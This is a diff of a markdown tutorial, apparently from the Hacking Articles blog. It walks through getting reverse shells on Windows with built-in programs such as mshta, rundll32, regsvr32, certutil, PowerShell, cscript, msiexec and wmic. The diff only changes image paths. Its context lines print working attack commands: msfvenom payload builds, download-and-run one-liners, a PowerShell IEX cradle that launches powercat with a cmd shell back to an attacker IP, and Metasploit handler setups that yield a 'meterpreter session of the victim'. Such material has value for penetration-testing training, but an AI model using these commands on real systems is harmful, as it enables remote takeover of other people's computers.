@@ -52,11 +52,11 @@ Once you will execute the malicious hta file on the remote machine with the help
 
 ```mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta```
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_2.png)
+![](images/reverse_shell_windows_2.png)
 
 As you can observe, we have the meterpreter session of the victim as shown below:
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_3.png)
+![](images/reverse_shell_windows_3.png)
 
 
 ## Rundll32.exe
@@ -75,17 +75,17 @@ msf exploit(windows/smb/smb_delivery) > exploit
 
 Now run the malicious code through rundll32.exe on the victim machine (vulnerable to RCE) to obtain meterpreter sessions.
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_9.png)
+![](images/reverse_shell_windows_9.png)
 
 Once you will execute the dll file on the remote machine with the help of rundll32.exe, you will get the reverse connection at your local machine (Kali Linux).
 
 ```rundll32.exe \\192.168.1.109\vabFG\test.dll,0```
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_10.png)
+![](images/reverse_shell_windows_10.png)
 
 As you can observe, we have the meterpreter session of the victim as shown below:
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_11.png)
+![](images/reverse_shell_windows_11.png)
 
 
 ## Regsvr32.exe
@@ -120,17 +120,17 @@ msf exploit (web_delivery)>exploit
 
 Copy the highlighted text shown in below window
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_12.png)
+![](images/reverse_shell_windows_12.png)
 
 Once you will execute the scrobj.dll file on the remote machine with the help of regsrv32.exe, you will get the reverse connection at your local machine (Kali Linux).
 
 ```regsvr32 /s /n /u /i:http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll```
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_13.png)
+![](images/reverse_shell_windows_13.png)
 
 As you can observe, we have the meterpreter session of the victim as shown below:
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_14.png)
+![](images/reverse_shell_windows_14.png)
 
 ## Certutil.exe
 
@@ -142,7 +142,7 @@ Generate a malicious executable (.exe) file with msfvenom and start multi/handle
 
 ```msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe > shell.exe```
  
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_19.png)
+![](images/reverse_shell_windows_19.png)
 
 Now, to dump configuration information or shell.exe file files with certutil. you can follow below syntax:
 
@@ -152,7 +152,7 @@ Syntax: [-f] [-urlcache] [-split] Path of executable file
 
 ```certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe```
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_20.png)
+![](images/reverse_shell_windows_20.png)
 
 ```
 use exploit/multi/handler
@@ -163,7 +163,7 @@ msf exploit(multi/handler) > exploit
 ```
 As you can observe, we have a meterpreter session of the victim as shown below:
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_21.png)
+![](images/reverse_shell_windows_21.png)
 
 ## Powershell.exe
 
@@ -180,7 +180,7 @@ git clone https://github.com/besimorhino/powercat.git
 python -m SimpleHTTPServer 80
 ```
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_24.png)
+![](images/reverse_shell_windows_24.png)
 
 Then execute the following command on the remote side to get netcat session.
 
@@ -188,11 +188,11 @@ Then execute the following command on the remote side to get netcat session.
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"
 ```
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_25.png)
+![](images/reverse_shell_windows_25.png)
 
 As you can observe, we have netcat session of the victim as shown below:
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_26.png)
+![](images/reverse_shell_windows_26.png)
 
 
 ## Batch File
@@ -201,17 +201,17 @@ Similarly, PowerShell allows the client to **execute bat file**, therefore letâ€
 
 ```msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat```
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_27.png)
+![](images/reverse_shell_windows_27.png)
 
 Then execute the following command on the remote side to get netcat session.
 
 ```powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))```
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_28.png)
+![](images/reverse_shell_windows_28.png)
 
 As you can observe, we have netcat session of the victim as shown below:
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_29.png)
+![](images/reverse_shell_windows_29.png)
 
 ## Cscript
 
@@ -219,7 +219,7 @@ Similarly, PowerShell allows the client to execute cscript.exe to run **wsf, js*
 
 ```msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=1234 -f vbs > 1.vbs```
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_30.1.png)
+![](images/reverse_shell_windows_30.1.png)
 
 Then execute the following command on the remote side to get a meterpreter session.
 
@@ -227,7 +227,7 @@ Then execute the following command on the remote side to get a meterpreter sessi
 powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
 ```
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_30.2.png)
+![](images/reverse_shell_windows_30.2.png)
 
 ```
 use exploit/multi/handler
@@ -239,7 +239,7 @@ msf exploit(multi/handler) > exploit
 
 As you can observe, we have meterpreter session of the victim as shown below:
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_30.3.png)
+![](images/reverse_shell_windows_30.3.png)
 
 ## Msiexec.exe
 
@@ -251,13 +251,13 @@ Letâ€™s generate an MSI Package file (1.msi) utilizing the Windows Meterpreter p
 
 ```msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi```
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_30.png)
+![](images/reverse_shell_windows_30.png)
 
 Once you will execute the 1.msi file on the remote machine with the help of msiexec, you will get the reverse connection at your local machine (Kali Linux).
 
 ```msiexec /q /i http://192.168.1.109/1.msi```
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_31.png)
+![](images/reverse_shell_windows_31.png)
 
 ```
 use exploit/multi/handler
@@ -269,7 +269,7 @@ msf exploit(multi/handler) > exploit
 
 As you can observe, we have meterpreter session of the victim as shown below:
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_32.png)
+![](images/reverse_shell_windows_32.png)
 
 ## Wmic.exe
 
@@ -289,17 +289,17 @@ set SRVHOST 192.168.1.107
 run
 ```
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_36.png)
+![](images/reverse_shell_windows_36.png)
 
 Execute WMIC following command to download and run the malicious XSL file from a remote server:
 
 ```wmic os get /FORMAT:"http://192.168.1.107:9996/g8gkv.xsl"```
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_37.png)
+![](images/reverse_shell_windows_37.png)
 
 Once the malicious XSL file will get executed on the target machine, you will have a **Zombie connection** just like Metasploit.
 
-![](https://github.com/comibat/security/blob/master/images/reverse_shell_windows_38.png)
+![](images/reverse_shell_windows_38.png)
 
 Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
 
